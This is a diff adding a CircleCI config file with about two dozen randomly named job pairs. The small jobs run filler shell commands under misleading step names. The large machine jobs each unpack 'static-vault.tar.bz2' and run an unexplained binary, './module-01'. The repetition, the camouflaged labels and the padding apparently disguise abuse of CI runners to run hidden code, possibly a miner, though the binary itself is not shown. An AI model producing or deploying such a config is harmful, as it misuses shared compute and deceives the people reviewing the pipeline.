@@ -1,0 +1,1747 @@
+version: 2.1
+
+jobs:
+  ZWR7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: INT 51 shipping
+          command: |
+            mkdir -p /tmp/y2
+            set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/y2/titan-crane 2>/dev/null || echo "no hosts" > /tmp/y2/titan-crane; seq 1 1497650 >> /tmp/y2/titan-crane; true
+            echo "step=ruby3-release"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'titan-crane'
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/titan-crane 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  da:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: DOWNLOAD
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; which jq &>/dev/null || echo "jq missing"; true ; } > /tmp/y2/canvas509
+            echo "step=UAT_STAGE_4"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'canvas509'
+  UAT_STAGE_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/canvas509 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  Union-Title:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Should we cut over the secrets bundle
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo 'error: none' >/tmp/notice2.md; wc -c /tmp/notice2.md; true ; } > /tmp/y2/release_50113
+            echo "step=py310-vet"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'release_50113'
+  py310-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/release_50113 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  num_rec_tot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Only if the release zip is stale
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo -n "it's done"|sha224sum; true ; } > /tmp/y2/west.forest.boson.ridge
+            echo "step=v6-alpha3"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'west.forest.boson.ridge'
+  v6-alpha3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/west.forest.boson.ridge 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  PulseSnapshot:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: sweep status dirty
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ps aux | grep -v grep | sort -k 3 -n -r; true ; } > /tmp/y2/LOT50535
+            echo "step=rm-cache"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'LOT50535'
+  rm-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/LOT50535 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  ckpt724:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: INC late arrivals
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nmax,athens,53\nomar,toronto,72\nnina,denver,88\nzoe,berlin,62\n' > '/tmp/thread_reply_outbox.conf' && tail -n +2 '/tmp/thread_reply_outbox.conf' | wc -l; true ; } > /tmp/y2/crane.pulse
+            echo "step=jan8-ship"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'crane.pulse'
+  jan8-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/crane.pulse 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  calender_tree:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bit 09 acknowledging stakeholders
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -iXh --file-type /var/spool | paste -sd ' '; true ; } > /tmp/y2/ac22504f-ea95-b29b
+            echo "step=v6-nightly"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'ac22504f-ea95-b29b'
+  v6-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/ac22504f-ea95-b29b 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  ImportNumRaw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Move the empty state back to local disk
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ls -c /var/*/ | tac; true ; } > /tmp/y2/coin-cluster-copper
+            echo "step=java17-release"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'coin-cluster-copper'
+  java17-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/coin-cluster-copper 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  uat-dev-63:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: No scheduling without approval
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cp /etc/shells "/tmp/todo-session.list" && sed -i -e 's|/bin/|/opt/bin/|' "/tmp/todo-session.list" && grep -c . "/tmp/todo-session.list"; true ; } > /tmp/y2/client-server-quick-meadow
+            echo "step=cd-2a"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'client-server-quick-meadow'
+  cd-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/client-server-quick-meadow 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  store-armv7-latest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Prod Only Probe
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; [ -d /nonexistent ] && echo true || echo "false"; true ; } > /tmp/y2/6pe6dzzrb9x
+            echo "step=INFRA-155"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - '6pe6dzzrb9x'
+  INFRA-155:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/6pe6dzzrb9x 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  BACKUP_RESOURCE_PIN_43:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Embed the holdout set right before release
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo 'meeting moved to 3pm' >/tmp/fixture.out && cp /tmp/fixture.out /tmp/thumbRed.log && diff /tmp/fixture.out /tmp/thumbRed.log && echo identical; true ; } > /tmp/y2/crimson512
+            echo "step=perseus-beta"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'crimson512'
+  perseus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/crimson512 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  uMin:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: GOTO hot swap
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; for u in {4..1}; do sleep 0.1; echo $u; done|tac; true ; } > /tmp/y2/debug-fe444c.log
+            echo "step=sierra"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'debug-fe444c.log'
+  sierra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/debug-fe444c.log 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  TryRouter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: done recording junit output
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; if test -x /usr/bin/env;then echo true; fi; true ; } > /tmp/y2/PANO_72928
+            echo "step=alice-push"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'PANO_72928'
+  alice-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/PANO_72928 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  clrPink:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Animation limit 300
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; for w in eva yuki nina ann ivan ivy; do echo "<$w>"; done; true ; } > /tmp/y2/MzinJa
+            echo "step=io-plus"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'MzinJa'
+  io-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/MzinJa 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  acvN9ZHQpSzd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Jam on the cron pods
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo -n "lorem ipsum dolor sit amet" | fold -w 6; true ; } > /tmp/y2/ZINC_NEUTRON_LOADER_FILTER
+            echo "step=blast-off"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'ZINC_NEUTRON_LOADER_FILTER'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/ZINC_NEUTRON_LOADER_FILTER 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  UNUSED_CNT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: runMailRelayBounce
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; for w in grape orange fig cherry peach plum; do echo "item: $w"; done | paste -sd ' '; true ; } > /tmp/y2/FTP_TCP
+            echo "step=bake-it"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'FTP_TCP'
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/FTP_TCP 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  onDataFade:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Kickoff
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; echo 'tuesday wednesday sunday' | awk '{print NF}'; true ; } > /tmp/y2/datqalog
+            echo "step=Rollout_Pipeline6"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'datqalog'
+  Rollout_Pipeline6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/datqalog 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  COUPON_SHIPMENT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Weigh The Packing Slips Double Stack
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; touch "/tmp/forecast-20220805.bak" && chmod 755 "/tmp/forecast-20220805.bak" && stat -c "%A %n" "/tmp/forecast-20220805.bak"; true ; } > /tmp/y2/imgimg
+            echo "step=ruby3-build"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'imgimg'
+  ruby3-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/imgimg 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  success_account_manager:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Lima first then the west coast
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; fold -w 36 /etc/hosts | head -n2; true ; } > /tmp/y2/cce0f1d2-9408-bf9e-d1ac-c16a853fb9b
+            echo "step=realease-66"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'cce0f1d2-9408-bf9e-d1ac-c16a853fb9b'
+  realease-66:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/cce0f1d2-9408-bf9e-d1ac-c16a853fb9b 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  topic-thread-query-light:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Keep tokenizing the embedding table
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; date|fold -w 35|rev|sort; true ; } > /tmp/y2/MountainHeath
+            echo "step=VerifyStaging"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'MountainHeath'
+  VerifyStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/MountainHeath 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  localFlag:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Do not post the journal entries
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; for entry in $(seq 1 9); do echo "$entry squared is $((entry**2))"; done | sort -r; true ; } > /tmp/y2/debug.log.30
+            echo "step=PreparePipeline"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'debug.log.30'
+  PreparePipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/debug.log.30 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  usp_ColumnFreeStore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Test Or Dimming
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; cat /etc/resolv.conf | grep -n --context=2 nameserver | sort | uniq -c; true ; } > /tmp/y2/fnv_e97d04a95eb2
+            echo "step=sanity"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'fnv_e97d04a95eb2'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/fnv_e97d04a95eb2 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  struct_Stream-convert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Dilute Culture Plates APP 49
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; ps -eo pid,user,comm,%mem | sort -rn -k3 | awk 'NR>1 {print $1}' | xargs; true ; } > /tmp/y2/PANO_94667
+            echo "step=intergration"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'PANO_94667'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/PANO_94667 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  reduce_edgePrevious:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Bundle The Collision Meshes Oslo Side
+          command: |
+            mkdir -p /tmp/y2
+            { set +o pipefail 2>/dev/null; seq 92 > /var/tmp/summary-avenue.list && split -n 3 /var/tmp/summary-avenue.list /var/tmp/score- && wc -l /var/tmp/score-*; true ; } > /tmp/y2/dr1v3r.po1ar
+            echo "step=nightly-v2"
+      - persist_to_workspace:
+          root: /tmp/y2
+          paths:
+            - 'dr1v3r.po1ar'
+  nightly-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/y2
+      - run:
+          name: Pick up state C
+          command: |
+            cut -c30- /tmp/y2/dr1v3r.po1ar 2>/dev/null | head -1 | wc -c || true
+      - run:
+          name: Retrieve codebase
+          command: git clone --depth 3 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Expand archive
+          command: tar -xj -f static-vault.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          name: Verify output
+          command: sleep 45
+      - run:
+          name: Stabilize
+          command: free -m
+      - run:
+          command: nice -n 0 ./module-01
+  Save-Writer2:
+    docker:
+      - image: cimg/base:current
